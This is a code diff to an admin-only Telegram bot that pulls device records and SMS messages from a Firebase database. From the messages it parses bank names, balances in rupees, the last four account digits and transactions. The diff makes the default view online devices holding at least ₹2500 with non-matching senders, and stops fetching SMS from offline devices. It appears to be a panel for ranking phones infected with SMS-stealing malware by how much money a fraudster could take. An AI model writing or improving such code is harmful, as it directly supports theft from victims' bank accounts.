@@ -675,7 +675,7 @@ def selected(records: list[Record]) -> list[Record]:
     return rs
 
 
-def format_report(records: list[Record], mode: str = "all") -> str:
+def format_report(records: list[Record], mode: str = "online_no_match") -> str:
     rs = selected(records)
     allowed_senders = store.senders()
 
@@ -687,7 +687,12 @@ def format_report(records: list[Record], mode: str = "all") -> str:
     elif mode == "no_match":
         shown = [r for r in rs if not allowed_senders or not (set(r.sender_ids) & allowed_senders)]
     elif mode == "online_no_match":
-        shown = [r for r in rs if r.online == "online" and (not allowed_senders or not (set(r.sender_ids) & allowed_senders))]
+        # Default: ONLINE only + Sender Match NO only
+        shown = [
+            r for r in rs
+            if r.online == "online"
+            and (not allowed_senders or not (set(r.sender_ids) & allowed_senders))
+        ]
     elif mode == "online":
         shown = [r for r in rs if r.online == "online"]
     elif mode == "offline":
@@ -709,10 +714,14 @@ def format_report(records: list[Record], mode: str = "all") -> str:
         "",
     ]
     if not shown:
-        out.append(f"No devices found with Available Balance ≥ ₹{int(BALANCE_THRESHOLD)}.")
+        out.append(
+            f"No devices found (filter: ≥ ₹{int(BALANCE_THRESHOLD)}"
+            + (", Online only" if mode in {"online", "online_no_match"} else "")
+            + (", Match NO only" if mode in {"no_match", "online_no_match"} else "")
+            + ")."
+        )
     for i, r in enumerate(shown[:MAX_ROWS], 1):
         matched = bool(allowed_senders and set(r.sender_ids) & allowed_senders)
-        sender_text = ", ".join(r.sender_ids[:8]) or "(none)"
         bal_line = f"₹{r.available_balance:,.2f}" if r.available_balance else "—"
         bank_line = r.bank_name or "—"
         acct = f"••{r.account_last4}" if r.account_last4 else "—"
@@ -721,8 +730,10 @@ def format_report(records: list[Record], mode: str = "all") -> str:
             sign = "+" if r.transaction_type == "credit" else "-"
             txn = f"{sign}₹{r.transaction_amount} ({r.transaction_type or '?'})"
 
+        # Hide "Sender match: YES" noise when user wants only NO; still show for clarity as NO
+        match_label = "NO" if not matched else "YES"
         out.append(
-            f"<b>{i}. {esc(r.device_id or r.client_id or r.identity)}</b> — Sender match: {'YES' if matched else 'NO'}\n"
+            f"<b>{i}. {esc(r.device_id or r.client_id or r.identity)}</b> — Sender match: {match_label}\n"
             f"Bank: {esc(bank_line)} | Balance: <b>{esc(bal_line)}</b> | A/C: {esc(acct)}\n"
             f"Txn: {esc(txn or '—')} | Network: {esc(r.network)} | Online: {esc(r.online)}\n"
             f"Battery: {esc(r.battery)} | Last seen: {esc(r.last_seen)}\n"
@@ -733,8 +744,8 @@ def format_report(records: list[Record], mode: str = "all") -> str:
 
 def report_keyboard() -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup([
-        [InlineKeyboardButton("All (≥2500)", callback_data="report:all"), InlineKeyboardButton("Matched", callback_data="report:matched")],
-        [InlineKeyboardButton("No match", callback_data="report:no_match"), InlineKeyboardButton("Online + no match", callback_data="report:online_no_match")],
+        [InlineKeyboardButton("Online + no match", callback_data="report:online_no_match"), InlineKeyboardButton("Online", callback_data="report:online")],
+        [InlineKeyboardButton("No match", callback_data="report:no_match"), InlineKeyboardButton("All (≥2500)", callback_data="report:all")],
         [InlineKeyboardButton("Offline", callback_data="report:offline"), InlineKeyboardButton("Refresh", callback_data="report:refresh")],
     ])
 
@@ -810,8 +821,8 @@ async def firebase_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.effective_message.reply_text(firebase_url_details(value))
         return
     store.set("firebase_url", value.rstrip("/"))
-    await update.effective_message.reply_text("Firebase URL saved. Reading the root data now …")
-    await run_scan(update.effective_message, ROOT_PATH, "all", True)
+    await update.effective_message.reply_text("Firebase URL saved. Scanning online devices …")
+    await run_scan(update.effective_message, ROOT_PATH, "online_no_match", True)
 
 
 @admin_only
@@ -822,8 +833,8 @@ async def firebase_url_message(update: Update, context: ContextTypes.DEFAULT_TYP
         host = (parsed.hostname or "").lower()
         if host.endswith(".firebaseio.com") or host.endswith(".firebasedatabase.app"):
             store.set("firebase_url", value.rstrip("/"))
-            await update.effective_message.reply_text("Firebase URL saved. Reading the root data now …")
-            await run_scan(update.effective_message, ROOT_PATH, "all", True)
+            await update.effective_message.reply_text("Firebase URL saved. Scanning online devices …")
+            await run_scan(update.effective_message, ROOT_PATH, "online_no_match", True)
 
 
 @admin_only
@@ -878,7 +889,7 @@ async def scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
     path = context.args[0] if context.args else ROOT_PATH
     path = path if path.startswith("/") else "/" + path
     await update.effective_message.reply_text(f"Starting fresh scan at {path} …")
-    await run_scan(update.effective_message, path, "all", True)
+    await run_scan(update.effective_message, path, "online_no_match", True)
 
 
 # Cap how many message trees we pull per scan (prevents hang on huge DBs like 300+ devices)
@@ -920,16 +931,15 @@ async def _fetch_messages_for_ids(
     return out
 
 
-async def run_scan(message: Any, path: str, mode: str = "all", with_buttons: bool = True) -> None:
+async def run_scan(message: Any, path: str, mode: str = "online_no_match", with_buttons: bool = True) -> None:
     async with scan_lock:
         sid = store.start(path)
         try:
             # IMPORTANT: do NOT download full root (messages blob is huge and hangs).
-            # Load clients + devices only, then pull messages per-device like the panel.
+            # Load clients + devices only, then pull messages only for ONLINE devices.
             clients: dict[str, Any] = {}
             devices: dict[str, Any] = {}
 
-            await message.reply_text("Loading clients …")
             try:
                 c = await asyncio.wait_for(firebase_read("clients"), timeout=30)
                 if isinstance(c, dict):
@@ -944,7 +954,6 @@ async def run_scan(message: Any, path: str, mode: str = "all", with_buttons: boo
             except Exception as exc:
                 log.debug("devices read failed/absent: %s", exc)
 
-            # If custom path was given and clients empty, try that path once (non-root preferred)
             if not clients and not devices and path not in ("", "/"):
                 try:
                     snap = await asyncio.wait_for(firebase_read(path), timeout=40)
@@ -953,10 +962,6 @@ async def run_scan(message: Any, path: str, mode: str = "all", with_buttons: boo
                             clients = snap["clients"]
                         if isinstance(snap.get("devices"), dict):
                             devices = snap["devices"]
-                        # only use inline messages if already small
-                        if isinstance(snap.get("messages"), dict) and len(snap["messages"]) <= 30:
-                            # rare small DB case
-                            pass
                 except Exception as exc:
                     log.warning("path read failed: %s", exc)
 
@@ -968,36 +973,26 @@ async def run_scan(message: Any, path: str, mode: str = "all", with_buttons: boo
                     "No clients/devices found. Check Firebase URL and that rules allow public read on /clients."
                 )
 
-            # Prefer online devices first for message fetch, then the rest (capped)
             def _is_online_id(cid: str) -> bool:
                 node = devices.get(cid) if isinstance(devices.get(cid), dict) else clients.get(cid)
                 if not isinstance(node, dict):
                     return False
                 return online_value_from_dict(node) == "online"
 
+            # ONLY online devices — offline are skipped completely (as requested)
             online_ids = [cid for cid in client_ids if _is_online_id(cid)]
-            offline_ids = [cid for cid in client_ids if cid not in set(online_ids)]
-            prioritized = online_ids + offline_ids
-            to_fetch = prioritized[:MAX_MESSAGE_FETCH]
+            to_fetch = online_ids[:MAX_MESSAGE_FETCH]
 
             await message.reply_text(
-                f"Devices: {len(client_ids)} (online≈{len(online_ids)}). "
-                f"Fetching SMS for {len(to_fetch)} devices (cap {MAX_MESSAGE_FETCH}) …"
+                f"Online devices: {len(online_ids)} / {len(client_ids)}. "
+                f"Checking SMS on {len(to_fetch)} online devices …"
             )
 
-            async def progress(done: int, total: int) -> None:
-                if done in {20, 40, 60, 80, 100} or done == total:
-                    await message.reply_text(f"SMS progress: {done}/{total} …")
-
-            messages_map = await _fetch_messages_for_ids(to_fetch, concurrency=6, progress_cb=progress)
+            # No per-20 progress spam in chat
+            messages_map = await _fetch_messages_for_ids(to_fetch, concurrency=6, progress_cb=None)
 
             records = scan_device_snapshot(snapshot, path or "/", messages_override=messages_map)
             store.finish(sid, records, "completed")
-
-            with_bal = sum(1 for r in records if r.available_balance >= BALANCE_THRESHOLD)
-            await message.reply_text(
-                f"Scan done. Parsed balances ≥ ₹{int(BALANCE_THRESHOLD)}: {with_bal} / {len(records)} devices."
-            )
             await reply_report(message, format_report(records, mode), with_buttons)
         except Exception as e:
             log.exception("scan failed")
@@ -1009,10 +1004,10 @@ async def run_scan(message: Any, path: str, mode: str = "all", with_buttons: boo
 async def report_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
-    mode = (query.data or "report:all").split(":", 1)[-1]
+    mode = (query.data or "report:online_no_match").split(":", 1)[-1]
     if mode == "refresh":
         await query.message.reply_text("Refreshing Firebase data …")
-        await run_scan(query.message, ROOT_PATH, "all", True)
+        await run_scan(query.message, ROOT_PATH, "online_no_match", True)
         return
     row = store.latest()
     if not row or row["status"] != "completed":
